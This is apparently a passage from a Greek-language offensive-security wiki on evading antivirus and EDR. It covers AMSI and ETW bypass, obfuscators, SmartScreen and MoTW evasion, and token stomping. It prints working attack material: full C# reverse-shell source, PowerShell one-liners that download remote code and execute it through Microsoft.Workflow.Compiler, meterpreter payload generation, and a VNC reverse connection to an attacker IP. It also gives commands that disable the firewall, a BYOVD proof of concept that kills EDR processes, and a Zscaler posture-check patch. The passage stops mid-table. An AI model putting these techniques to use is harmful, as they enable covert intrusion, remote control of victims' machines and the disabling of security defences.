- **Use Powershell version 2**: Αν χρησιμοποιήσετε PowerShell έκδοση 2, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε έτσι: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Χρησιμοποιήστε [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να δημιουργήσετε μια PowerShell χωρίς άμυνες (αυτό είναι που χρησιμοποιεί το `powerpick` από το Cobal Strike).


## Απόκρυψη

> [!TIP]
> Πολλές τεχνικές απόκρυψης βασίζονται στην κρυπτογράφηση δεδομένων, η οποία θα αυξήσει την εντροπία του binary και θα διευκολύνει τα AVs και EDRs να το εντοπίσουν. Να είστε προσεκτικοί με αυτό και ίσως να εφαρμόζετε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή πρέπει να παραμείνουν κρυφά.

### Αποκρυπτογράφηση ConfuserEx-Protected .NET Binaries

Όταν αναλύετε malware που χρησιμοποιεί το ConfuserEx 2 (ή εμπορικά forks) είναι συνηθισμένο να αντιμετωπίζετε πολλά επίπεδα προστασίας που θα μπλοκάρουν decompilers και sandboxes. Η παρακάτω ροή εργασίας αποκαθιστά αξιόπιστα ένα σχεδόν-πρωτότυπο IL που στη συνέχεια μπορεί να γίνει decompile σε C# με εργαλεία όπως dnSpy ή ILSpy.

1.  Anti-tampering removal – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor του *module* (`<Module>.cctor`). Αυτό επίσης τροποποιεί το PE checksum έτσι οποιαδήποτε αλλαγή θα προκαλέσει crash στο binary. Χρησιμοποιήστε **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες metadata, να ανακτήσετε τα XOR keys και να ξαναγράψετε ένα καθαρό assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Η έξοδος περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`) που μπορεί να είναι χρήσιμες όταν φτιάχνετε τον δικό σας unpacker.

2.  Symbol / control-flow recovery – τροφοδοτήστε το *clean* αρχείο στο **de4dot-cex** (ένα ConfuserEx-aware fork του de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – επιλέγει το ConfuserEx 2 profile  
• το de4dot θα αναιρέσει το control-flow flattening, θα επαναφέρει τα αρχικά namespaces, classes και ονόματα μεταβλητών και θα αποκρυπτογραφήσει τις σταθερές συμβολοσειρές.

3.  Proxy-call stripping – Το ConfuserEx αντικαθιστά άμεσες κλήσεις με ελαφριά wrappers (a.k.a *proxy calls*) για να δυσχεράνει περαιτέρω το decompilation. Αφαιρέστε τα με **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Μετά από αυτό το βήμα θα πρέπει να παρατηρείτε κανονικές .NET API όπως `Convert.FromBase64String` ή `AES.Create()` αντί για αδιαφανείς wrapper συναρτήσεις (`Class8.smethod_10`, …).

4.  Manual clean-up – τρέξτε το προκύπτον binary στο dnSpy, ψάξτε για μεγάλα Base64 blobs ή χρήση `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload. Συχνά το malware το αποθηκεύει ως TLV-encoded byte array αρχικοποιημένο μέσα σε `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** να χρειάζεται να τρέξετε το κακόβουλο δείγμα – χρήσιμο όταν εργάζεστε σε offline workstation.

> 🛈  Το ConfuserEx παράγει ένα custom attribute με το όνομα `ConfusedByAttribute` που μπορεί να χρησιμοποιηθεί ως IOC για αυτόματη διαλογή δειγμάτων.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Σκοπός αυτού του project είναι να παρέχει ένα open-source fork της σουίτας μεταγλώττισης [LLVM](http://www.llvm.org/) που μπορεί να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και προστασίας από παραποίηση.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstates how to use `C++11/14` language to generate, at compile time, obfuscated code without using any external tool and without modifying the compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated operations που παράγονται από το πλαίσιο C++ template metaprogramming, κάνοντας τη ζωή αυτού που θέλει να crack-άρει την εφαρμογή λίγο πιο δύσκολη.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz είναι ένας x64 binary obfuscator που είναι ικανός να obfuscate διάφορα PE αρχεία όπως: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame είναι ένας απλός metamorphic code engine για αυθαίρετα executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator είναι ένα fine-grained code obfuscation framework για γλώσσες που υποστηρίζονται από LLVM, χρησιμοποιώντας ROP (return-oriented programming). ROPfuscator obfuscates ένα πρόγραμμα σε επίπεδο assembly code μετατρέποντας κανονικές εντολές σε ROP chains, ματαιώνοντας την φυσική μας αντίληψη της κανονικής ροής ελέγχου.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt είναι ένας .NET PE Crypter γραμμένος σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor είναι ικανός να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

## SmartScreen & MoTW

Ίσως έχετε δει αυτή την οθόνη όταν κατεβάζετε κάποια εκτελέσιμα από το internet και τα εκτελείτε.

Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που έχει σχεδιαστεί για να προστατεύει τον τελικό χρήστη από την εκτέλεση πιθανώς κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen λειτουργεί κυρίως με μια προσέγγιση βασισμένη στη φήμη, που σημαίνει ότι εφαρμογές που δεν κατεβάζονται συχνά θα ενεργοποιούν το SmartScreen, ειδοποιώντας και εμποδίζοντας τον τελικό χρήστη από το να εκτελέσει το αρχείο (αν και το αρχείο μπορεί ακόμη να εκτελεστεί κάνοντας κλικ στο More Info -> Run anyway).

**MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier το οποίο δημιουργείται αυτόματα κατά το κατέβασμα αρχείων από το internet, μαζί με το URL από το οποίο κατεβάστηκε.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που κατέβηκε από το internet.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι εκτελέσιμα που είναι υπογεγραμμένα με ένα **trusted** signing certificate **δεν θα ενεργοποιήσουν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψετε τα payloads σας από το να πάρουν το Mark of The Web είναι να τα πακετάρετε μέσα σε κάποιο είδος container, όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που πακετάρει payloads σε output containers για να αποφύγει το Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows που επιτρέπει σε εφαρμογές και συστατικά του συστήματος να **καταγράφουν γεγονότα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφάλειας για να παρακολουθούν και να εντοπίζουν κακόβουλες δραστηριότητες.

Παρόμοια με το πώς το AMSI απενεργοποιείται (παρακάμπτεται), είναι επίσης δυνατό να κάνετε τη συνάρτηση **`EtwEventWrite`** της διεργασίας user space να επιστρέφει αμέσως χωρίς να καταγράφει γεγονότα. Αυτό γίνεται με το να τροποποιήσετε τη συνάρτηση στη μνήμη ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά την καταγραφή ETW για εκείνη τη διεργασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Το φόρτωμα C# binaries στη μνήμη είναι γνωστό εδώ και καιρό και παραμένει ένας εξαιρετικός τρόπος για την εκτέλεση των post-exploitation εργαλείων σας χωρίς να εντοπιστείτε από AV.

Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να ακουμπήσει τον δίσκο, θα χρειαστεί να ανησυχούμε μόνο για το patching του AMSI για όλη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) παρέχουν ήδη τη δυνατότητα να εκτελούν C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να το κάνετε:

- **Fork\&Run**

Αυτό περιλαμβάνει το **spawning a new sacrificial process**, το injection του post-exploitation malicious code σας σε εκείνη τη νέα διεργασία, την εκτέλεση του malicious code και, όταν τελειώσει, τον τερματισμό της νέας διεργασίας. Αυτό έχει πλεονεκτήματα και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση λαμβάνει χώρα **outside** της διεργασίας Beacon implant μας. Αυτό σημαίνει ότι αν κάτι στις post-exploitation ενέργειές μας πάει στραβά ή εντοπιστεί, υπάρχει **πολύ μεγαλύτερη πιθανότητα** το **implant** μας να επιβιώσει. Το μειονέκτημα είναι ότι έχετε **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Πρόκειται για το injection του post-exploitation malicious code **into its own process**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία νέας διεργασίας και το σκανάρισμα από AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του payload σας, υπάρχει μια **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon** καθώς μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα για το C# Assembly loading, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **from PowerShell**, δείτε [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατόν να εκτελέσετε malicious code χρησιμοποιώντας άλλες γλώσσες δίνοντας στη συμβιβασμένη μηχανή πρόσβαση **to the interpreter environment installed on the Attacker Controlled SMB share**.

Επιτρέποντας πρόσβαση στα Interpreter Binaries και στο environment στο SMB share μπορείτε να **execute arbitrary code in these languages within memory** της συμβιβασμένης μηχανής.

Το repo αναφέρει: Το Defender εξακολουθεί να σκανάρει τα scripts αλλά χρησιμοποιώντας Go, Java, PHP κ.λπ. έχουμε **περισσότερη ευελιξία για να παρακάμψουμε static signatures**. Δοκιμές με τυχαία μη-αποκρυπτογραφημένα reverse shell scripts σε αυτές τις γλώσσες απέδειξαν επιτυχία.

## TokenStomping

Token stomping είναι μια τεχνική που επιτρέπει σε έναν attacker να **manipulate the access token or a security product like an EDR or AV**, επιτρέποντάς τους να μειώσουν τα προνόμια του ώστε η διεργασία να μην τερματιστεί αλλά να μην έχει δικαιώματα για έλεγχο κακόβουλων δραστηριοτήτων.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Όπως περιγράφεται στο [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να αναπτύξετε απλώς το Chrome Remote Desktop στον υπολογιστή του θύματος και στη συνέχεια να το χρησιμοποιήσετε για takeover και να διατηρήσετε persistence:
1. Κατεβάστε από https://remotedesktop.google.com/, κάντε κλικ στο "Set up via SSH", και μετά κάντε κλικ στο MSI αρχείο για Windows για να κατεβάσετε το MSI αρχείο.
2. Τρέξτε τον installer silently στον υπολογιστή του θύματος (απαιτούνται δικαιώματα admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα Chrome Remote Desktop και πατήστε next. Ο οδηγός θα ζητήσει να εξουσιοδοτήσετε· πατήστε το κουμπί Authorize για να συνεχίσετε.
4. Εκτελέστε την δοθείσα παράμετρο με κάποιες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Σημειώστε την παράμετρο pin η οποία επιτρέπει να ορίσετε το pin χωρίς χρήση του GUI).


## Advanced Evasion

Η Evasion είναι ένα πολύ περίπλοκο θέμα — μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές telemetry σε ένα μόνο σύστημα, οπότε είναι πρακτικά αδύνατο να παραμείνετε εντελώς αθέατοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον που αντιμετωπίζετε θα έχει τα δικά του δυνατά και αδύνατα σημεία.

Σας προτρέπω έντονα να παρακολουθήσετε αυτή την ομιλία από [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια αίσθηση για περισσότερες Advanced Evasion τεχνικές.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτό είναι επίσης μια εξαιρετική ομιλία από [@mariuszbit](https://twitter.com/mariuszbit) για Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Μπορείτε να χρησιμοποιήσετε [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) που θα **remove parts of the binary** μέχρι να **βρει ποιο τμήμα το Defender** θεωρεί malicious και να σας το διαχωρίσει.\
Ένα άλλο εργαλείο που κάνει **το ίδιο** είναι [**avred**](https://github.com/dobin/avred) με μια ανοικτή web υπηρεσία στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows10, όλα τα Windows ερχόντουσαν με έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως διαχειριστής) κάνοντας:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Κάνε το **να ξεκινάει** όταν το σύστημα ξεκινάει και **τρέξε** το τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλάξτε το telnet port** (stealth) και απενεργοποιήστε το firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τα bin downloads, όχι το setup)

**ΣΤΟΝ ΥΠΟΛΟΓΙΣΤΗ**: Εκτελέστε _**winvnc.exe**_ και ρυθμίστε τον διακομιστή:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε κωδικό στο _VNC Password_
- Ορίστε κωδικό στο _View-Only Password_

Στη συνέχεια, μεταφέρετε το δυαδικό _**winvnc.exe**_ και το **προσφάτως** δημιουργημένο αρχείο _**UltraVNC.ini**_ μέσα στο **θύμα**

#### **Reverse connection**

Ο **επιτιθέμενος** πρέπει να **εκτελέσει μέσα** στον **υπολογιστή του** το δυαδικό `vncviewer.exe -listen 5900` ώστε να είναι **προετοιμασμένος** να συλλάβει μια reverse **VNC connection**. Στη συνέχεια, στο **θύμα**: Εκκινήστε το daemon `winvnc.exe -run` και τρέξτε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΣΟΧΗ:** Για να διατηρήσετε τη διακριτικότητα δεν πρέπει να κάνετε κάποια πράγματα

- Μην ξεκινήσετε `winvnc` αν τρέχει ήδη ή θα προκαλέσετε ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν τρέχει με `tasklist | findstr winvnc`
- Μην ξεκινήσετε `winvnc` χωρίς `UltraVNC.ini` στον ίδιο κατάλογο αλλιώς θα ανοίξει [το παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην τρέξετε `winvnc -h` για βοήθεια ή θα προκαλέσετε ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Μέσα στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **ξεκινήστε τον lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Μεταγλωττίση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποιήστε το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# χρησιμοποιώντας compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators για C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Παράδειγμα χρήσης python για κατασκευή injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Η ομάδα Storm-2603 εκμεταλλεύτηκε ένα μικρό console utility γνωστό ως **Antivirus Terminator** για να απενεργοποιήσει endpoint protections πριν αποθέσει ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *signed* driver** και τον καταχράται για να εκτελέσει privileged kernel operations που ούτε οι υπηρεσίες Protected-Process-Light (PPL) AV μπορούν να μπλοκάρουν.

Κύρια σημεία
1. **Signed driver**: Το αρχείο που τοποθετείται στο δίσκο είναι `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το Antiy Labs’ “System In-Depth Analysis Toolkit”. Επειδή ο driver φέρει έγκυρη υπογραφή Microsoft φορτώνεται ακόμη και όταν το Driver-Signature-Enforcement (DSE) είναι ενεργό.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Η πρώτη γραμμή καταχωρεί τον driver ως **kernel service** και η δεύτερη τον ξεκινάει ώστε `\\.\ServiceMouse` να γίνει προσβάσιμο από user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Τερματίζει μια αυθαίρετη διεργασία μέσω PID (χρησιμοποιείται για να τερματίσει υπηρεσίες Defender/EDR) |
| `0x990000D0` | Διαγράφει ένα αυθαίρετο αρχείο στο δίσκο |
| `0x990001D0` | Αποφορτώνει τον driver και αφαιρεί την υπηρεσία |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD παρακάμπτει εντελώς τις user-mode protections· ο κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *protected* processes, να τους κάνει terminate, ή να αλλοιώσει kernel objects ανεξάρτητα από PPL/PP, ELAM ή άλλα hardening features.

Detection / Mitigation
•  Ενεργοποιήστε την vulnerable-driver block list της Microsoft (`HVCI`, `Smart App Control`) ώστε τα Windows να αρνούνται τη φόρτωση του `AToolsKrnl64.sys`.  
•  Παρακολουθείτε τη δημιουργία νέων *kernel* services και ειδοποιείτε όταν ένας driver φορτώνεται από έναν world-writable κατάλογο ή δεν βρίσκεται στην allow-list.  
•  Ελέγχετε για user-mode handles σε custom device objects ακολουθούμενα από ύποπτες κλήσεις `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Το Zscaler **Client Connector** εφαρμόζει device-posture κανόνες τοπικά και βασίζεται σε Windows RPC για να μεταφέρει τα αποτελέσματα σε άλλα components. Δύο αδύναμες σχεδιαστικές επιλογές καθιστούν δυνατή μια πλήρη παράκαμψη:

1. Η αξιολόγηση posture γίνεται **αποκλειστικά client-side** (ένας boolean αποστέλλεται στον server).  
2. Τα εσωτερικά RPC endpoints επικυρώνουν μόνο ότι το connecting executable είναι **signed by Zscaler** (μέσω `WinVerifyTrust`).

Με το **patching τεσσάρων signed binaries στο δίσκο** και οι δύο μηχανισμοί μπορούν να ουδετεροποιηθούν:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Πάντοτε επιστρέφει `1`, έτσι κάθε έλεγχος θεωρείται compliant |
